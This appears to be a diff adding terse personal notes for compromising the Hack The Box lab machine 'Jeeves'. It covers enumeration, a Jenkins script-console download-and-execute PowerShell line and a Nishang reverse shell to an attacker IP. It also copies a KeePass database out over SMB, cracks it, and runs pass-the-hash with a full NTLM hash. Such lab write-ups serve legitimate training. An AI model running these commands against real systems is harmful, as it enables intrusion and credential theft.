@@ -1,0 +1,58 @@
+nmap -sC -sV -oA nmap/initial 10.10.10.63
+
+gobuster -u http://10.10.10.63 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 15
+
+Save output and target specific:
+
+gobuster -u http://10.10.10.63:50000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 15 -o apache.txt
+
+Powershell tools:
+https://github.com/samratashok/nishang
+
+root@oscp:/opt/powershell/nishang/Shells# cp Invoke-PowerShellTcp.ps1 ~/Documents/htb/jeeves/www
+
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.11 -Port 8001
+
+nc -lvnp 8001
+
+http://10.10.10.63:50000/askjeeves/script:
+cmd = """ cmd.exe /c echo "Hello World" """
+println cmd.execute().text
+
+cmd = """ powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11/rev.ps1')" """
+println cmd.execute().text
+
+Apache check connections:
+/var/log/apache2# 
+
+Download Power UP tools:
+https://github.com/PowerShellMafia/PowerSploit
+
+Check user access right:
+IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11/PowerUp.ps1')
+Invoke-AllChecks
+
+indirect show content
+(get-content user.txt).substring(0,16)
+
+SMB server
+https://hackingandsecurity.blogspot.com/2016/08/impacket.html
+Run SMB share
+python smbserver.py TRY ~/Documents/htb/jeeves/smb
+Confirm SMB
+smbclient -L 10.10.14.11 --no-pass      
+
+Map drive
+New-PSDrive -Name "FollowMe" -PSProvider "FileSystem" -Root "\\10.10.14.11\TRY"
+cd FollowMe:
+cp C:\Users\kohsuke\Documents\CEH.kdbx .
+
+keepass2john CEH.kdbx
+cp result like:
+https://hashcat.net/wiki/doku.php?id=example_hashes
+
+pth-winexe -U jeeves/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.63 cmd.exe
+
+c:\Users\Administrator\Desktop>dir /r
+powershell Get-Content -Path "hm.txt" -Stream "root.txt"
+
